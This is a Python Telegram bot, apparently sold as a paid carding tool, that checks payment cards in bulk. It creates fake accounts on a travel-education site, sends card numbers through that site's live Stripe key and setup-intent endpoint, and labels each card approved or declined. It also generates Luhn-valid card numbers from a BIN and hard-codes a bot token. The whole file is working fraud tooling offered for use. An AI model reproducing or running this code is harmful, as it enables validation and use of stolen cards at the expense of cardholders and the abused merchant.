from datetime import datetime, timedelta
from bs4 import BeautifulSoup
import json
import sys
import re
import random
import string
import os
import time
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Telegram Bot Token
TELEGRAM_TOKEN = "7597039904:AAE1ThfpS0dHLUByaehM9EtwQ9UROQhJ3Yc"

# Banner
bannerss = """
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                            │
│         ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗  ██████╗ ██╗   ██╗         │
│         ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔═══██╗╚██╗ ██╔╝         │
│         ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝██║   ██║ ╚████╔╝          │
│         ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██║   ██║  ╚██╔╝           │
│         ██████╔╝██║  ██║██║  ██║██║  ██╗██████╔╝╚██████╔╝   ██║            │
│         ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝            │
│                                                        Boot Script 2.0     │
└────────────────────────────────────────────────────────────────────────────┘

 | Version: 1.2
PAID VERSION!
"""

# Required modules
required_modules = ["requests", "bs4", "re", "json", "random", "string", "datetime"]

# Helper functions
def generate_random_email(length=8, domain=None):
    common_domains = ["gmail.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

def create_session():
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
        data = [
            ('afurd_field_nonce', nonce),
            ('_wp_http_referer', '/register/'),
            ('pre_page', ''),
            ('email', email),
            ('password', 'Esahatam2009@'),
            ('register', 'Register'),
        ]
        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(email + ':' + 'Esahatam2009@')
            return session
        else:
            return None
    except Exception as e:
        return None

def manage_session_file():
    session_file = "session.txt"
    if os.path.exists(session_file):
        session = load_session_from_file(session_file)
        if session:
            return session
    session = create_session()
    if session:
        save_session_to_file(session, session_file)
        return session
    return None

def save_session_to_file(session, file_path):
    with open(file_path, "w") as file:
        cookies = session.cookies.get_dict()
        file.write(str(cookies))

def load_session_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            session_data = file.read().strip()
            session = requests.Session()
            cookies = eval(session_data)
            session.cookies.update(cookies)
            return session
    except Exception as e:
        return None

def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", headers={"Accept-Version": "3"})
        if response.status_code == 200:
            bin_data = response.json()
            return {
                "type": bin_data.get("type", "UNKNOWN"),
                "bank": bin_data.get("bank", {}).get("name", "UNKNOWN"),
                "country": bin_data.get("country", {}).get("name", "UNKNOWN"),
            }
        else:
            return {"type": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN"}
    except Exception as e:
        return {"type": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN"}

def check_credit_cards(cc_list, session, is_mass=False):
    start_time = time.time()
    total = len(cc_list)
    hit = 0
    dec = 0
    ccn = 0
    results = []
    for cc in cc_list:
        try:
            card = cc.replace('/', '|')
            lista = card.split("|")
            cc = lista[0]
            mm = lista[1]
            yy = lista[2]
            if "20" in yy:
                yy = yy.split("20")[1]
            cvv = lista[3]
            bin_info = get_bin_info(cc)
            headers = {
                'authority': 'www.thetravelinstitute.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            }
            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
            html = response.text
            nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)
            data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
            res = response.text
            if 'error' in res:
                error = response.json()['error']['message']
                if 'code' in error:
                    results.append(format_response("CCN ⚠️", card, bin_info, "CVV Required! ⚠️", time.time() - start_time))
                    ccn += 1
                else:
                    results.append(format_response("Declined ❌", card, bin_info, error, time.time() - start_time))
                    dec += 1
            else:
                iddd = response.json()['id']
                headers = {
                    'authority': 'www.thetravelinstitute.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.thetravelinstitute.com',
                    'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
                params = {
                    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
                }
                data = {
                    'action': 'create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': iddd,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': nonce,
                }
                response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
                res = response.json()
                if res['success'] == False:
                    error = res['data']['error']['message']
                    if 'code' in error:
                        results.append(format_response("CCN ⚠️", card, bin_info, "CVV Required! ⚠️", time.time() - start_time))
                        ccn += 1
                    else:
                        results.append(format_response("Declined ❌", card, bin_info, error, time.time() - start_time))
                        dec += 1
                else:
                    results.append(format_response("Approved ✅", card, bin_info, "Success!", time.time() - start_time))
                    hit += 1
        except Exception as e:
            results.append(format_response("Invalid ❌", card, {"type": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN"}, "Invalid Card Number! ❌", time.time() - start_time))
    processing_time = time.time() - start_time
    minutes = int(processing_time // 60)
    seconds = processing_time % 60
    if is_mass:
        summary = f"""
[+] Gateway: Single + Mass Stripe Auth + CCN
[~] Total: {total}
[>] Declined: {dec}
[>] Hit: {hit}
[>] CCN: {ccn}
[÷] Time: {minutes} min and {seconds:.2f} sec
"""
        results.append(summary)
    return "\n".join(results)

def format_response(status, card, bin_info, response, processing_time):
    return f"""
━━━━━━━━━━━━━━━━━━

{status}  

𝗖𝗮𝗿𝗱 - {card}  
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - Single + Mass Stripe Auth + CCN  
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ⤿ {response} ⤾  

𝗜𝗻𝗳𝗼 - {bin_info['type']}  
𝐁𝐚𝐧𝐤 - {bin_info['bank']}  
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 - {bin_info['country']}  

𝗧𝗶𝗺𝗲 - {processing_time:.1f}s  

━━━━━━━━━━━━━━━━━━
"""

# Function to generate valid credit card numbers using Luhn algorithm
def generate_cc(bin):
    def luhn_checksum(card_number):
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10

    def calculate_luhn(partial_card_number):
        check_digit = luhn_checksum(int(partial_card_number) * 10)
        return check_digit if check_digit == 0 else 10 - check_digit

    cc_number = bin
    while len(cc_number) < 15:
        cc_number += str(random.randint(0, 9))
    cc_number += str(calculate_luhn(cc_number))
    return cc_number

# Function to generate 10 credit cards in the specified format
def generate_ccs(bin):
    ccs = []
    for _ in range(10):
        cc = generate_cc(bin)
        mm = f"{random.randint(1, 12):02d}"
        yy = f"{random.randint(2024, 2030)}"
        cvv = f"{random.randint(100, 999)}"
        ccs.append(f"{cc}|{mm}|{yy}|{cvv}")
    return ccs

# Telegram Bot Handlers
async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text('Welcome to the CC Checker Bot! Use /chk to check a single card or /mass to check multiple cards from a file.')

async def chk(update: Update, context: CallbackContext) -> None:
    cc = update.message.text.split(' ')[1]
    session = manage_session_file()
    if session:
        # Send "Please wait" message
        wait_message = await update.message.reply_text("Please wait ⌛\nProcessing your request...")
        result = check_credit_cards([cc], session, is_mass=False)
        # Edit the "Please wait" message with the final response
        await wait_message.edit_text(result)
    else:
        await update.message.reply_text("Failed to create session.")

async def mass(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text("Please upload a .txt file with credit cards.")
    context.user_data['waiting_for_file'] = True

async def handle_file(update: Update, context: CallbackContext) -> None:
    if context.user_data.get('waiting_for_file', False):
        file = await update.message.document.get_file()
        await file.download_to_drive('cards.txt')
        session = manage_session_file()
        if session:
            # Send "Please wait" message
            wait_message = await update.message.reply_text("Please wait ⌛\nProcessing your request...")
            with open('cards.txt', 'r') as f:
                cc_list = [line.strip() for line in f if line.strip()]
            result = check_credit_cards(cc_list, session, is_mass=True)
            # Edit the "Please wait" message with the final response
            await wait_message.edit_text(result)
        else:
            await update.message.reply_text("Failed to create session.")
        context.user_data['waiting_for_file'] = False

# Handler for /gen command
async def gen(update: Update, context: CallbackContext) -> None:
    try:
        bin = update.message.text.split(' ')[1]
        if len(bin) != 6 or not bin.isdigit():
            await update.message.reply_text("Invalid BIN. Please provide a 6-digit BIN.")
            return
        ccs = generate_ccs(bin)
        formatted_ccs = "\n".join([f"𝗖𝗮𝗿𝗱 - {cc}" for cc in ccs])
        response = f"""
━━━━━━━━━━━━━━━━━━

𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 💳  

{formatted_ccs}  

𝐓𝐨𝐭𝐚𝐥 - 𝟏𝟎 𝐂𝐚𝐫𝐝𝐬  

━━━━━━━━━━━━━━━━━━
"""
        await update.message.reply_text(response)
    except IndexError:
        await update.message.reply_text("Please provide a BIN. Usage: /gen <6-digit BIN>")

def main() -> None:
    application = Application.builder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(CommandHandler("mass", mass))
    application.add_handler(CommandHandler("gen", gen))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    application.run_polling()

if __name__ == "__main__":
    main()
